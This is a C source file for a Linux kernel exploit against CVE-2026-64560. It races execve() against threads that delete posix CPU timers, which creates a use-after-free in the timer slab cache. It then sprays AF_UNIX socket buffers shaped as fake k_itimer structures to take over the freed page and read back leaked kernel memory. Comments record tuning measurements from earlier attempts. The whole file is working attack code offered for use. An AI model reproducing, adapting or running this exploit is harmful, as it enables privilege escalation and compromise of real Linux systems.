/*
 * l61.c - CVE-2026-64560 landing on lhasa, using the *proven* trigger shape.
 *
 * The trigger is cve64560_probe3's structure verbatim, because that one is
 * measured to hit on XRing O3 (+84 persistent posix_timers_cache leak per
 * 40 rounds / 320 execs):
 *   - the victim creates N cpu-clock timers on its own CLK_PROC_CPU,
 *   - 4 deleter threads are started and the main thread waits until all of
 *     them have entered the delete loop,
 *   - only then is the exec worker released, so execve() runs into a storm
 *     that is already inside posix_cpu_timer_del(),
 *   - the post-exec image touches no shared memory; it sleeps then exits,
 *     and exit runs cleanup_timers -> timerqueue_del -> rb_erase.
 *
 * The landing part is the part probe3 lacks: the parent sprays 8 KB AF_UNIX
 * frags (whole-page fake k_itimer) *before* the victims exit, so the order-1
 * page that posix_timers_cache returned to the buddy allocator is ours by the
 * time the dangling node is walked.
 *
 * The spray is unconditional on purpose: gating it on a slabinfo drain gate
 * meant most attempts sprayed nothing at all.
 *
 * usage: l61 <attempts> <timers> <victims> <frags> <target> <child_sleep_ms>
 */
#define _GNU_SOURCE
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CLK_PROC_CPU    2
#define MAX_TIMERS      512
#define MAXVICTIM       32
#define MAXFRAG         16000
#define ITIMER_NODE_OFF 0x0e0UL
#define SLOT_STRIDE     0x180UL
#define PAGE_FRAG_SZ    8192UL
#define FILL_BYTE       0x41

static unsigned long long g_target;
static int g_child_sleep_ms = 6000;
static int g_wait_ms = 3500;

static volatile int g_release;
static volatile unsigned g_del_started;

static void *exec_worker(void *a)
{
    (void)a;
    while (!g_release)
        sched_yield();
    char *const av[] = { (char *)"/proc/self/exe", (char *)"--child", NULL };
    char *const ep[] = { NULL };
    execve(av[0], av, ep);
    _exit(7);
}

struct del_arg { timer_t *tids; int n; };

static void *delete_storm(void *a)
{
    struct del_arg *d = a;
    __sync_fetch_and_add(&g_del_started, 1);
    for (int i = 0; i < d->n; i++)
        syscall(SYS_timer_delete, d->tids[i]);
    return NULL;
}

static void victim(int ntimers, int nthreads)
{
    static timer_t tids[MAX_TIMERS];
    struct sigevent ev;
    struct itimerspec its;
    pthread_t delths[8];
    struct del_arg da[8];
    pthread_t wth;
    int made = 0;

    signal(SIGUSR1, SIG_IGN);
    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;
    memset(&its, 0, sizeof its);
    its.it_value.tv_sec = 3600;

    for (int i = 0; i < ntimers; i++) {
        if (syscall(SYS_timer_create, CLK_PROC_CPU, &ev, &tids[i]) != 0)
            break;
        syscall(SYS_timer_settime, tids[i], 0, &its, NULL);
        made++;
    }
    if (made < 2)
        _exit(3);

    if (nthreads > 8) nthreads = 8;
    if (nthreads < 1) nthreads = 1;

    g_release = 0;
    if (pthread_create(&wth, NULL, exec_worker, NULL) != 0)
        _exit(4);

    int per = made / nthreads;
    g_del_started = 0;
    for (int t = 0; t < nthreads; t++) {
        da[t].tids = &tids[t * per];
        da[t].n = (t == nthreads - 1) ? (made - t * per) : per;
        pthread_create(&delths[t], NULL, delete_storm, &da[t]);
    }
    for (int s = 0; s < 200000 && g_del_started < (unsigned)nthreads; s++)
        sched_yield();
    g_release = 1;

    for (;;)
        pause();
}

static int g_ring[MAXFRAG];
static int g_ring_n, g_ring_cap;

static void build_fragment(unsigned char *p, size_t len, unsigned long long left)
{
    memset(p, FILL_BYTE, len);
    for (unsigned long slot = 0; slot + SLOT_STRIDE <= len; slot += SLOT_STRIDE) {
        unsigned long base = slot + ITIMER_NODE_OFF;
        if (base + 0x30 > len) break;
        *(unsigned long long *)(p + base + 0x00) = 0;
        *(unsigned long long *)(p + base + 0x08) = 0;
        *(unsigned long long *)(p + base + 0x10) = left;
        *(unsigned long long *)(p + base + 0x18) = 0;
        *(unsigned long long *)(p + base + 0x20) = 0;
        *(unsigned long long *)(p + base + 0x28) = 0;
    }
}

static int frag_spray(int n, const unsigned char *buf)
{
    int ok = 0;
    for (int i = 0; i < n; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0) break;
        if (send(sv[0], buf, PAGE_FRAG_SZ, MSG_NOSIGNAL) != (ssize_t)PAGE_FRAG_SZ) {
            close(sv[0]); close(sv[1]); break;
        }
        close(sv[0]);
        if (g_ring_n < g_ring_cap) g_ring[g_ring_n++] = sv[1];
        else close(sv[1]);
        ok++;
    }
    return ok;
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--child")) {
        signal(SIGUSR1, SIG_IGN);
        usleep(g_child_sleep_ms * 1000);
        _exit(0);
    }

    int attempts = argc > 1 ? atoi(argv[1]) : 200;
    int ntimer   = argc > 2 ? atoi(argv[2]) : 400;
    int nv       = argc > 3 ? atoi(argv[3]) : 8;
    int nfrag    = argc > 4 ? atoi(argv[4]) : 8000;
    if (argc > 5) g_target = strtoull(argv[5], NULL, 0);
    if (argc > 6) g_child_sleep_ms = atoi(argv[6]);
    if (argc > 7) g_wait_ms = atoi(argv[7]);

    if (ntimer > MAX_TIMERS) ntimer = MAX_TIMERS;
    if (nv > MAXVICTIM) nv = MAXVICTIM;
    if (nfrag > MAXFRAG) nfrag = MAXFRAG;
    g_ring_cap = nfrag + 512;

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    unsigned char *fbuf = malloc(PAGE_FRAG_SZ);
    if (!fbuf) return 1;
    build_fragment(fbuf, PAGE_FRAG_SZ, g_target);

    printf("l61 target=%#llx attempts=%d timers=%d victims=%d frag=%d child_sleep=%dms\n",
           g_target, attempts, ntimer, nv, nfrag, g_child_sleep_ms);
    fflush(stdout);

    for (int a = 1; a <= attempts; a++) {
        pid_t vpid[MAXVICTIM];
        for (int j = 0; j < nv; j++) {
            pid_t v = fork();
            if (v == 0)
                victim(ntimer, 4);
            vpid[j] = v;
        }

        /* let the storms finish and execve complete, then take the pages
         * that posix_timers_cache just handed back to the buddy allocator */
        /* Empty slabs need ~3 s to reach the buddy allocator (measured), so
         * spraying at ~100 ms was always too early: the dangling page was still
         * owned by the slab cache and no frag could ever take it. */
        usleep(g_wait_ms * 1000);
        int got = frag_spray(nfrag, fbuf);

        /* now release the victims: exit -> cleanup_timers -> rb_erase */
        for (int j = 0; j < nv; j++)
            if (vpid[j] > 0) kill(vpid[j], SIGKILL);
        usleep(150000);

        int leaks = 0;
        for (int i = 0; i < g_ring_n && leaks < 4; i++) {
            unsigned char back[PAGE_FRAG_SZ];
            ssize_t n = recv(g_ring[i], back, sizeof back, MSG_DONTWAIT);
            if (n != (ssize_t)sizeof back) continue;
            for (size_t off = 0; off + 8 <= sizeof back; off += 8) {
                if (memcmp(back + off, fbuf + off, 8) == 0) continue;
                unsigned long long v;
                memcpy(&v, back + off, 8);
                printf("LEAK attempt=%d off=%#zx val=%#llx\n", a, off, v);
                leaks++;
                if (leaks >= 4) break;
            }
        }
        for (int i = 0; i < g_ring_n; i++) close(g_ring[i]);
        g_ring_n = 0;

        if ((a % 10) == 0 || leaks) {
            printf("attempt=%d frag=%d leaks=%d\n", a, got, leaks);
            fflush(stdout);
        }
    }
    printf("DONE attempts=%d\n", attempts);
    return 0;
}
